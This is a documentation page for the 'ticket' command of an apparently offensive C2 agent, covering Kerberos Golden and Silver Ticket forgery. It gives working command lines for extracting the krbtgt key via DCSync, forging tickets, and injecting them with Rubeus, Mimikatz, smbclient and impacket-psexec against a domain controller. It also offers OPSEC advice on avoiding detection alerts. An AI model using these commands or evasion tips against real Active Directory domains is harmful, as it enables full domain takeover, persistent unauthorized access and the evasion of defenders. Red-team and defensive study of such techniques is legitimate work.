+++
title = "ticket"
chapter = false
weight = 106
hidden = false
+++

## Summary

Forge Kerberos tickets (Golden Ticket / Silver Ticket) from extracted encryption keys. This is a pure cryptographic operation that runs entirely on the agent — no network traffic to any Domain Controller.

**Golden Ticket** (T1558.001): Forges a TGT using the `krbtgt` account's encryption key. Grants domain-wide access for the ticket lifetime.

**Silver Ticket** (T1558.002): Forges a TGS for a specific service using the service account's encryption key. Grants access to that service only.

Outputs tickets in kirbi format (for Rubeus/Mimikatz on Windows) or ccache format (for Linux/macOS `KRB5CCNAME`).

## Arguments

| Argument | Required | Description |
|----------|----------|-------------|
| `-action` | Yes | Action to perform: `forge` |
| `-realm` | Yes | Kerberos realm / AD domain (e.g., `CORP.LOCAL`) |
| `-username` | Yes | Username for the forged ticket (e.g., `Administrator`) |
| `-domain_sid` | Yes | Domain SID (e.g., `S-1-5-21-1234567890-...`) |
| `-key` | Yes | Encryption key in hex (from DCSync, hashdump, etc.) |
| `-key_type` | No | Key type: `aes256` (default), `aes128`, `rc4`/`ntlm` |
| `-user_rid` | No | User RID (default: 500 for Administrator) |
| `-kvno` | No | Key Version Number (default: 2) |
| `-lifetime` | No | Ticket lifetime in hours (default: 24) |
| `-format` | No | Output format: `kirbi` (default) or `ccache` |
| `-spn` | No | SPN for Silver Ticket (e.g., `cifs/dc01.corp.local`). Omit for Golden Ticket. |

## Usage

### Golden Ticket with AES256 (kirbi)

First extract the krbtgt key via [dcsync](/agents/fawkes/commands/dcsync/):

```
dcsync -server 192.168.1.1 -username admin@corp.local -password pass -target krbtgt
```

Then forge a Golden Ticket:

```
ticket -action forge -realm CORP.LOCAL -username Administrator -domain_sid S-1-5-21-1234567890-1234567890-1234567890 -key <aes256_hex_key>
```

### Golden Ticket with RC4/NTLM (ccache for Linux)

```
ticket -action forge -realm CORP.LOCAL -username Administrator -domain_sid S-1-5-21-... -key <ntlm_hash> -key_type rc4 -format ccache
```

### Silver Ticket for CIFS

```
ticket -action forge -realm CORP.LOCAL -username Administrator -domain_sid S-1-5-21-... -key <computer_aes256_key> -spn cifs/dc01.corp.local
```

### Silver Ticket for MSSQL

```
ticket -action forge -realm CORP.LOCAL -username sqlsvc -domain_sid S-1-5-21-... -key <service_aes256_key> -spn MSSQLSvc/db01.corp.local:1433
```

## Output

```
[*] Golden Ticket (TGT) forged successfully
    User:      Administrator@CORP.LOCAL (RID: 500)
    Domain:    CORP.LOCAL
    SID:       S-1-5-21-1234567890-1234567890-1234567890
    Key Type:  aes256 (etype 18)
    Valid:     2026-02-24 12:00:00 UTC — 2026-02-25 12:00:00 UTC
    Format:    kirbi
    KVNO:      2

[+] Base64 kirbi ticket:
doIFxjCCBcKgAwIBBaEDAgEWo...

[*] Usage: Rubeus.exe ptt /ticket:<base64>
[*] Usage: [IO.File]::WriteAllBytes('ticket.kirbi', [Convert]::FromBase64String('<base64>'))
```

## Using Forged Tickets

### Windows (kirbi format)

```powershell
# Import with Rubeus
Rubeus.exe ptt /ticket:<base64>

# Save to file and import with Mimikatz
[IO.File]::WriteAllBytes('ticket.kirbi', [Convert]::FromBase64String('<base64>'))
kerberos::ptt ticket.kirbi
```

### Linux/macOS (ccache format)

```bash
# Save ccache file
echo '<base64>' | base64 -d > /tmp/krb5cc_forged

# Set environment variable
export KRB5CCNAME=/tmp/krb5cc_forged

# Use with tools
smbclient -k //dc01.corp.local/C$
impacket-psexec -k -no-pass corp.local/Administrator@dc01
```

## Key Sources

| Key Type | Source | Key Length |
|----------|--------|------------|
| AES256 | DCSync, LSASS dump, hashdump | 64 hex chars (32 bytes) |
| AES128 | DCSync, LSASS dump | 32 hex chars (16 bytes) |
| RC4/NTLM | DCSync, hashdump, NTDS.dit | 32 hex chars (16 bytes) |

## OPSEC Considerations

{{% notice info %}}
Golden/Silver Ticket forging is a **local cryptographic operation** — no network traffic is generated by the `ticket` command itself. Detection relies on anomalous ticket usage (event IDs 4769, 4770) rather than the forging step.
{{% /notice %}}

- AES256 keys are preferred over RC4 — RC4 tickets may trigger alerts in environments monitoring for etype downgrade
- Silver Tickets are harder to detect than Golden Tickets since they don't touch the DC
- Golden Tickets survive password resets for all users except `krbtgt` (krbtgt password reset invalidates all Golden Tickets)
- Default lifetime is 24 hours; longer lifetimes may trigger anomaly detection

## MITRE ATT&CK Mapping

- **T1558.001** — Steal or Forge Kerberos Tickets: Golden Ticket
- **T1558.002** — Steal or Forge Kerberos Tickets: Silver Ticket
